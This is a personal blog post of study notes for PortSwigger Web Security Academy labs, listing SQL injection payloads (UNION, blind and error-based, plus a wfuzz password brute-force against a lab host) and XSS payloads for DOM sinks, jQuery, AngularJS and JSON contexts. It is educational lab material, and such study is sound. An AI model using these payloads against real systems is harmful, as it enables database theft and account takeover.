---
title: BurpSuite Lab
author: Yuchao
date: 2022-05-10 11:33:00 +0800
categories: [sec]
tags: [burpsuite]
math: true
mermaid: true
---

# sql injection

#### cheetsheet
<https://portswigger.net/web-security/sql-injection/cheat-sheet>

```
'+OR+1=1--
'+UNION+SELECT+NULL,NULL--

-- find columns are compatible with string data
'+UNION+SELECT+'abcdef',NULL,NULL--

-- oracle, find database type and version
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

-- mysql, find database type and verion
'+UNION+SELECT+'abc','def'#
'+UNION+SELECT+@@version,+NULL#

-- list database contents, not oracle
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

-- list database contents, oracle
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

-- blind, conditional responses
-- "Welcome back" message disappears if error
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

-- blind, error based, 
TrackingId=qi1dv3ezFEfn1WHY' || (select '' from users where rownum=1) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK
-- WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation. 
-- Conditional errors
-- You can test a single boolean condition and trigger a database error if the condition is true. Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- check if administrator exists.
Cookie: TrackingId=qi1dv3ezFEfn1WHY' || (SELECT CASE WHEN (length(password)>19) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' ) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK
-- when 19, return code500, mean > 19 is true; when 20, return code200, mean > 20 is false.
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- blind test password
-- wfuzz is much quicker than intruder.
wfuzz -H "Cookie: TrackingId=qi1dv3ezFEfn1WHY' || (SELECT CASE WHEN (SUBSTR(password,1,6)='1psbwFUZZ') THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' ) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK" -u https://aca41fa31e42c37cc0b00aa9001a0095.web-security-academy.net/filter?category=Pets -w /home/kali/wordlist/alphanum --sc 500
```

# Cross-site scripting

- url ``` web-security-academy.net/?search=<script>alert%281%29<%2Fscript> ```
- ``` <script> alert(1) </script>```

---

"View source" option won't work for DOM XSS testing 

---

document.write
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}
```
``` "><svg onload=alert(1)> ```

---

innerHTML
```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}

```
``` <img src=1 onerror=alert(1)> ```

---

jQuery selector sink
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

```javascript
<a id="author" href="javascript:alert(1)">0xZEN</a>
```
---

HTML ```<a>``` href Attribute
- ``` <a href="URL"> ```
- The URL of the link.
Possible values:
- An absolute URL - points to another web site (like href="http://www.example.com/default.htm")
- A relative URL - points to a file within a web site (like href="default.htm")
- Link to an element with a specified id within the page (like href="#section2")
- Other protocols (like https://, ftp://, mailto:, file:, etc..)
- A script (like href="javascript:alert('Hello');")    THIS ONE CAN BE USED TO XSS.

---

AngularJS expression
```
{{$on.constructor('alert(1)')()}}
```

---

Reflected DOM XSS
- reflected in json format
```javascript
{"results":[],"searchTerm":"asd"}
```
search: ``` \"-alert(1)}// ```
```javascript
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```
- note:  ``` \ ``` can not be interpretered alone, so if only one \ will be error in json.
- ``` a = {"results":[],"searchTerm":"\\\"} ``` Error
- ``` a = {"results":[],"searchTerm":"\\\\"} ``` Good
- An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called.
